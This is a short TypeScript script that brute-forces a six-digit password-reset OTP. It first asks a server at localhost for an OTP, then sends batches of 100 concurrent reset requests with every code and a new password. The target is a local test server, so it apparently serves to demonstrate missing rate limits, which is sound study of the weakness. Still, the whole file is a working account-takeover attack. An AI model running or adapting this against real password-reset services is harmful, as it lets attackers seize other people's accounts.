import axios from "axios";

async function tryOtp(otp:string){
    const res = await axios.post('http://localhost:3000/reset-password',{
        email: "a@gmail.com",
        otp,
        newPassword: "new"
    })
    return res;
}

async function main(){
    const res = await axios.post('http://localhost:3000/generate-otp',{
        email:"a@gmail.com"
    })
    
    for(let i=0;i<10000000;i+=100){
        console.log(i)
        try{
            const p =[]
            for(let j = i;j<i+100;j++){
                const otp = j.toLocaleString('en-us',{
                    minimumIntegerDigits:6,
                    useGrouping:false
                })
                p.push(tryOtp(otp));
            }
            await Promise.all(p)
        }catch(e){}
    }

}

main();
